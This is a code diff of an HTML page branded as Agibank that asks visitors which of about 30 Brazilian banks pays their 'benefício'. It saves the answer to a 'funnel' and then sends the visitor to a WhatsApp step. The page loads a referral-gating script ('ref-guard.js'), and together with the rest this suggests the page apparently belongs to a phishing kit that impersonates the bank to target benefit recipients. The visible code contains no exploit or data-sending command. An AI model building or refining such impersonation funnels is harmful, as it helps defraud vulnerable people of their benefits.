@@ -2,79 +2,393 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Agibank - Seleção de Banco</title>
-    <!-- Proteção por Referência -->
+    <!-- Proteção por Referência (?ref=) -->
     <script src="assets/js/ref-guard.js"></script>
     <script src="assets/js/tailwind.js"></script>
     <link href="assets/css/inter.css" rel="stylesheet">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <script src="assets/js/funnel.js"></script>
     <style>
-        body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #0064F5 0%, #003d99 100%); }
-        .bank-card { backdrop-filter: blur(10px); background: rgba(255, 255, 255, 0.95); }
-        .bank-option { transition: all 0.2s; border: 2px solid #e2e8f0; cursor: pointer; }
-        .bank-option:hover { border-color: #0064F5; background: #f0f7ff; }
-        .bank-option.selected { border-color: #0064F5; background: #e0efff; box-shadow: 0 0 0 2px rgba(0, 100, 245, 0.2); }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #0064F5 0%, #003d99 100%);
+            min-height: 100vh;
+        }
+        .bank-card {
+            backdrop-filter: blur(10px);
+            background: rgba(255, 255, 255, 0.98);
+            border-radius: 2.25rem;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+        }
+        .bank-option {
+            transition: all 0.2s ease;
+            border: 2px solid #e2e8f0;
+            cursor: pointer;
+        }
+        .bank-option:hover {
+            border-color: #0064F5;
+            background: #eff6ff;
+            transform: translateY(-1px);
+        }
+        .bank-option.selected {
+            border-color: #0064F5;
+            background: #eff6ff;
+            box-shadow: 0 0 0 2px rgba(0, 100, 245, 0.2);
+        }
+        .bank-option.selected .bank-radio {
+            border-color: #0064F5;
+            background-color: #0064F5;
+        }
+        /* Custom scrollbar */
+        #bankList::-webkit-scrollbar {
+            width: 6px;
+        }
+        #bankList::-webkit-scrollbar-track {
+            background: #f1f5f9;
+            border-radius: 9999px;
+        }
+        #bankList::-webkit-scrollbar-thumb {
+            background: #cbd5e1;
+            border-radius: 9999px;
+        }
+        #bankList::-webkit-scrollbar-thumb:hover {
+            background: #94a3b8;
+        }
     </style>
 </head>
 <body class="min-h-screen flex items-center justify-center p-4">
-    <div class="bank-card w-full max-w-md p-8 rounded-3xl shadow-2xl">
-        <div class="text-center mb-6">
+    <div class="bank-card w-full max-w-md p-6 sm:p-8">
+        <div class="text-center mb-5">
             <img src="assets/img/logo-agi.png" alt="Agibank" class="h-9 mx-auto mb-4 object-contain">
-            <h1 class="text-2xl font-bold text-gray-800">Recebimento</h1>
+            <h1 class="text-2xl font-black text-gray-800 tracking-tight">Recebimento</h1>
             <p class="text-gray-500 mt-1 text-sm">Por qual banco você recebe o seu benefício?</p>
         </div>
+
+        <!-- Campo de Busca de Banco -->
+        <div class="mb-3.5">
+            <div class="relative">
+                <input type="text" id="bankSearch" onkeyup="filterBanks()" placeholder="Buscar seu banco..." class="w-full pl-10 pr-4 py-3 bg-gray-50 border border-gray-200 rounded-2xl text-sm font-semibold text-gray-800 outline-none focus:border-[#0064F5] focus:bg-white transition-all">
+                <div class="absolute left-3.5 top-3.5 text-gray-400 pointer-events-none">
+                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>
+                </div>
+            </div>
+        </div>
         
-        <div class="space-y-2 max-h-[350px] overflow-y-auto pr-2 mb-6" id="bankList">
-            <div class="bank-option p-4 rounded-2xl font-semibold text-gray-700" onclick="selectBank(this, 'Crefisa')">
-                Crefisa
+        <!-- Lista Completa de Bancos com Agibank no Topo -->
+        <div class="space-y-2 max-h-[330px] overflow-y-auto pr-1 mb-5" id="bankList">
+            <!-- 1. Agibank no Topo -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectBank(this, 'Banco Agibank')">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>Banco Agibank</span>
+                </div>
             </div>
-            <div class="bank-option p-4 rounded-2xl font-semibold text-gray-700" onclick="selectBank(this, 'Banco do Brasil')">
-                Banco do Brasil
+
+            <!-- 2. Crefisa -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectBank(this, 'Crefisa')">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>Crefisa</span>
+                </div>
             </div>
-            <div class="bank-option p-4 rounded-2xl font-semibold text-gray-700" onclick="selectBank(this, 'Bradesco')">
-                Bradesco
+
+            <!-- 3. Banco do Brasil -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectBank(this, 'Banco do Brasil')">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>Banco do Brasil</span>
+                </div>
             </div>
-            <div class="bank-option p-4 rounded-2xl font-semibold text-gray-700" onclick="selectBank(this, 'Itaú Unibanco')">
-                Itaú Unibanco
+
+            <!-- 4. Bradesco -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectBank(this, 'Bradesco')">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>Bradesco</span>
+                </div>
             </div>
-            <div class="bank-option p-4 rounded-2xl font-semibold text-gray-700" onclick="selectBank(this, 'Caixa Econômica Federal')">
-                Caixa Econômica Federal
+
+            <!-- 5. Itaú Unibanco -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectBank(this, 'Itaú Unibanco')">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>Itaú Unibanco</span>
+                </div>
             </div>
-            <div class="bank-option p-4 rounded-2xl font-semibold text-gray-700" onclick="selectBank(this, 'Santander')">
-                Santander
+
+            <!-- 6. Caixa Econômica Federal -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectBank(this, 'Caixa Econômica Federal')">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>Caixa Econômica Federal</span>
+                </div>
             </div>
-            <div class="bank-option p-4 rounded-2xl font-semibold text-gray-700" onclick="selectBank(this, 'Banco Agibank')">
-                Banco Agibank
+
+            <!-- 7. Santander -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectBank(this, 'Santander')">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>Santander</span>
+                </div>
             </div>
-            <div class="bank-option p-4 rounded-2xl font-semibold text-gray-700" onclick="selectBank(this, 'Banco Inter')">
-                Banco Inter
+
+            <!-- 8. Banco Inter -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectBank(this, 'Banco Inter')">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>Banco Inter</span>
+                </div>
             </div>
-            <div class="bank-option p-4 rounded-2xl font-semibold text-gray-700" onclick="selectBank(this, 'Banco PAN')">
-                Banco PAN
+
+            <!-- 9. Banco PAN -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectBank(this, 'Banco PAN')">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>Banco PAN</span>
+                </div>
             </div>
-            <div class="bank-option p-4 rounded-2xl font-semibold text-gray-700" onclick="selectBank(this, 'Banco BMG')">
-                Banco BMG
+
+            <!-- 10. Banco BMG -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectBank(this, 'Banco BMG')">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>Banco BMG</span>
+                </div>
             </div>
-            <div class="bank-option p-4 rounded-2xl font-semibold text-gray-700" onclick="selectBank(this, 'BRB (Banco de Brasília)')">
-                BRB (Banco de Brasília)
+
+            <!-- 11. BRB (Banco de Brasília) -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectBank(this, 'BRB (Banco de Brasília)')">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>BRB (Banco de Brasília)</span>
+                </div>
             </div>
-            <div class="bank-option p-4 rounded-2xl font-semibold text-gray-700" onclick="selectBank(this, 'Banco Safra')">
-                Banco Safra
+
+            <!-- 12. Banco Safra -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectBank(this, 'Banco Safra')">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>Banco Safra</span>
+                </div>
             </div>
-            <div class="bank-option p-4 rounded-2xl font-semibold text-gray-700" onclick="selectBank(this, 'C6 Bank')">
-                C6 Bank
+
+            <!-- 13. C6 Bank -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectBank(this, 'C6 Bank')">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>C6 Bank</span>
+                </div>
             </div>
-            <div class="bank-option p-4 rounded-2xl font-semibold text-gray-700" onclick="selectBank(this, 'Outro Banco')">
-                Outro Banco
+
+            <!-- 14. Nubank -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectBank(this, 'Nubank')">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>Nubank</span>
+                </div>
             </div>
+
+            <!-- 15. Banco Mercantil do Brasil -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectBank(this, 'Banco Mercantil do Brasil')">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>Banco Mercantil do Brasil</span>
+                </div>
+            </div>
+
+            <!-- 16. Banrisul -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectBank(this, 'Banrisul')">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>Banrisul</span>
+                </div>
+            </div>
+
+            <!-- 17. Banco Daycoval -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectBank(this, 'Banco Daycoval')">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>Banco Daycoval</span>
+                </div>
+            </div>
+
+            <!-- 18. Sicredi -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectBank(this, 'Sicredi')">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>Sicredi</span>
+                </div>
+            </div>
+
+            <!-- 19. Sicoob -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectBank(this, 'Sicoob')">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>Sicoob</span>
+                </div>
+            </div>
+
+            <!-- 20. Facta Financeira -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectBank(this, 'Facta Financeira')">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>Facta Financeira</span>
+                </div>
+            </div>
+
+            <!-- 21. Banco BV (Votorantim) -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectBank(this, 'Banco BV (Votorantim)')">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>Banco BV (Votorantim)</span>
+                </div>
+            </div>
+
+            <!-- 22. PagBank -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectBank(this, 'PagBank')">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>PagBank</span>
+                </div>
+            </div>
+
+            <!-- 23. PicPay / Banco Original -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectBank(this, 'PicPay / Banco Original')">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>PicPay / Banco Original</span>
+                </div>
+            </div>
+
+            <!-- 24. Paraná Banco -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectBank(this, 'Paraná Banco')">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>Paraná Banco</span>
+                </div>
+            </div>
+
+            <!-- 25. Banco Master -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectBank(this, 'Banco Master')">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>Banco Master</span>
+                </div>
+            </div>
+
+            <!-- 26. Banco Inbursa -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectBank(this, 'Banco Inbursa')">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>Banco Inbursa</span>
+                </div>
+            </div>
+
+            <!-- 27. Banco Neon -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectBank(this, 'Banco Neon')">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>Banco Neon</span>
+                </div>
+            </div>
+
+            <!-- 28. Banco Digio -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectBank(this, 'Banco Digio')">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>Banco Digio</span>
+                </div>
+            </div>
+
+            <!-- 29. Banco Pine -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectBank(this, 'Banco Pine')">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>Banco Pine</span>
+                </div>
+            </div>
+
+            <!-- 30. Outro Banco -->
+            <div class="bank-option p-3.5 rounded-2xl font-semibold text-gray-700 flex items-center justify-between" onclick="selectOutroBanco(this)">
+                <div class="flex items-center space-x-3">
+                    <div class="bank-radio w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
+                        <div class="w-2 h-2 bg-white rounded-full"></div>
+                    </div>
+                    <span>Outro Banco</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Campo adicional caso o cliente selecione "Outro Banco" -->
+        <div id="outroBancoContainer" class="hidden mb-4">
+            <label class="block text-xs font-bold text-gray-600 uppercase mb-1.5 ml-1 tracking-wider">Qual o nome do seu banco?</label>
+            <input type="text" id="outroBancoInput" oninput="onOutroBancoTyped()" placeholder="Digite o nome do seu banco" class="w-full px-4 py-3.5 bg-gray-50 border-2 border-gray-200 rounded-2xl text-sm font-bold text-gray-800 outline-none focus:border-[#0064F5] focus:bg-white transition-all uppercase">
         </div>
         
         <div class="flex flex-col space-y-3">
-            <button type="button" id="btnAvancar" onclick="avancar()" disabled class="w-full bg-[#0064F5] hover:bg-[#0052cc] text-white font-bold py-4 rounded-2xl shadow-lg shadow-blue-200 transition-all transform opacity-50 cursor-not-allowed">
+            <button type="button" id="btnAvancar" onclick="avancar()" disabled class="w-full bg-[#0064F5] hover:bg-[#0052cc] text-white font-bold py-4 rounded-2xl shadow-lg shadow-blue-200 transition-all transform opacity-50 cursor-not-allowed text-base tracking-wide">
                 AVANÇAR
             </button>
             <button type="button" onclick="window.history.back()" class="w-full bg-gray-100 hover:bg-gray-200 text-gray-600 font-bold py-3.5 rounded-2xl transition-all text-sm">
@@ -89,23 +403,109 @@
         // Recupera banco anterior se já selecionado
         const savedData = getFunnelData();
         if (savedData.banco) {
+            let matched = false;
             const options = document.querySelectorAll('.bank-option');
             options.forEach(opt => {
-                if (opt.innerText.trim() === savedData.banco) {
+                const span = opt.querySelector('span');
+                if (span && span.innerText.trim().toLowerCase() === savedData.banco.trim().toLowerCase()) {
                     selectBank(opt, savedData.banco);
+                    matched = true;
+                }
+            });
+            if (!matched && savedData.banco) {
+                // Outro banco personalizado
+                const lastOption = options[options.length - 1];
+                selectOutroBanco(lastOption);
+                document.getElementById('outroBancoInput').value = savedData.banco;
+                selectedBankName = savedData.banco;
+            }
+        }
+
+        function filterBanks() {
+            const input = document.getElementById('bankSearch');
+            const filter = input.value.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, '');
+            const options = document.querySelectorAll('.bank-option');
+
+            options.forEach(opt => {
+                const text = opt.innerText.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, '');
+                if (text.includes(filter)) {
+                    opt.style.display = 'flex';
+                } else {
+                    opt.style.display = 'none';
+                }
+            });
+        }
+
+        function clearSelection() {
+            document.querySelectorAll('.bank-option').forEach(el => {
+                el.classList.remove('selected');
+                const radio = el.querySelector('.bank-radio');
+                if (radio) {
+                    radio.classList.remove('border-[#0064F5]', 'bg-[#0064F5]');
+                    radio.classList.add('border-gray-300');
                 }
             });
         }
 
         function selectBank(element, bankName) {
-            document.querySelectorAll('.bank-option').forEach(el => el.classList.remove('selected'));
+            clearSelection();
             element.classList.add('selected');
+            const activeRadio = element.querySelector('.bank-radio');
+            if (activeRadio) {
+                activeRadio.classList.add('border-[#0064F5]', 'bg-[#0064F5]');
+                activeRadio.classList.remove('border-gray-300');
+            }
+
+            document.getElementById('outroBancoContainer').classList.add('hidden');
             selectedBankName = bankName;
-            
+
             const btn = document.getElementById('btnAvancar');
             btn.disabled = false;
             btn.classList.remove('opacity-50', 'cursor-not-allowed');
             btn.classList.add('hover:-translate-y-1');
+        }
+
+        function selectOutroBanco(element) {
+            clearSelection();
+            element.classList.add('selected');
+            const activeRadio = element.querySelector('.bank-radio');
+            if (activeRadio) {
+                activeRadio.classList.add('border-[#0064F5]', 'bg-[#0064F5]');
+                activeRadio.classList.remove('border-gray-300');
+            }
+
+            const container = document.getElementById('outroBancoContainer');
+            container.classList.remove('hidden');
+            const input = document.getElementById('outroBancoInput');
+            input.focus();
+
+            if (input.value.trim().length >= 2) {
+                selectedBankName = input.value.trim().toUpperCase();
+                const btn = document.getElementById('btnAvancar');
+                btn.disabled = false;
+                btn.classList.remove('opacity-50', 'cursor-not-allowed');
+            } else {
+                selectedBankName = "";
+                const btn = document.getElementById('btnAvancar');
+                btn.disabled = true;
+                btn.classList.add('opacity-50', 'cursor-not-allowed');
+            }
+        }
+
+        function onOutroBancoTyped() {
+            const input = document.getElementById('outroBancoInput');
+            const btn = document.getElementById('btnAvancar');
+            if (input.value.trim().length >= 2) {
+                selectedBankName = input.value.trim().toUpperCase();
+                btn.disabled = false;
+                btn.classList.remove('opacity-50', 'cursor-not-allowed');
+                btn.classList.add('hover:-translate-y-1');
+            } else {
+                selectedBankName = "";
+                btn.disabled = true;
+                btn.classList.add('opacity-50', 'cursor-not-allowed');
+                btn.classList.remove('hover:-translate-y-1');
+            }
         }
 
         async function avancar() {
@@ -118,8 +518,8 @@
             sessionStorage.setItem('user_banco', selectedBankName);
             await saveFunnelData('banco', { banco: selectedBankName });
 
-            // Próxima etapa do funil: ANALISE
-            navTo('analise.html');
+            // Próxima etapa do funil: WHATSAPP
+            navTo('whatsapp.html');
         }
     </script>
 </body>
